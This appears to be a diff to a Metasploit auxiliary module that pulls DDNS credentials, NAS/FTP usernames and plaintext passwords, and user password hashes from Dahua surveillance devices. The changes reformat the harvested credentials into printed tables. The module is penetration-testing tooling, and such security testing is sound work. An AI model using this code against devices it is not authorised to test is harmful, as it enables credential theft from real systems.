@@ -142,8 +142,8 @@ class Metasploit3 < Msf::Auxiliary
       ddns_user = "#{val[4]}"
       ddns_pass = "#{val[5]}"
       ddns_table << ["#{ddns_service}", "#{ddns_server}", "#{ddns_port}", "#{ddns_domain}", "#{ddns_user}", "#{ddns_pass}"]
-      ddns_table.print
       unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
+        ddns_table.print
         report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
@@ -156,18 +156,21 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Nas Settings @ #{rhost}:#{rport}!:")
     server = ''
     port = ''
+    nas_table = Rex::Ui::Text::Table.new(
+      'Header' => 'Dahaua NAS Settings',
+      'Indent' => '1',
+      'Columns' => ['Nas Server', 'Nas Port', 'FTP User', 'FTP Pass']
+    )
     if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
       server = Regexp.last_match[1].unpack('C*').join('.')
       port = Regexp.last_match[2].unpack('S')
-      print_status("  Nas Server #{server}")
-      print_status("  Nas Port: #{port}")
     end
     if /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data
       ftpuser.strip!
       ftppass.strip!
       unless ftpuser.blank? || ftppass.blank?
-        print_good("  FTP User: #{ftpuser}")
-        print_good("  FTP Password: #{ftppass}")
+        nas_table << ["#{server}", "#{port}", "#{ftpuser}", "#{ftppass}"]
+        nas_table.print
         report_creds(
           host: server,
           port: port,
@@ -195,10 +198,16 @@ class Metasploit3 < Msf::Auxiliary
     return unless (response = sock.get_once)
     data = response.split('&&')
     usercount = 0
+    users_table = Rex::Ui::Text::Table.new(
+      'Header' => 'Dahua Users Hashes and groups',
+      'Indent' => '1',
+      'Columns' => ['Username', 'Password Hash', 'Permissions', 'Description']
+    )
     print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
     data.each do |val|
       usercount += 1
       pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
+      # print_status("Perms: #{val[/(([0-9][0-9]*, )*[0-9][0-9]*)/]}")
       value = pass.split(":")
       user = "#{value[1]}"
       md5hash = "#{value[2]}"
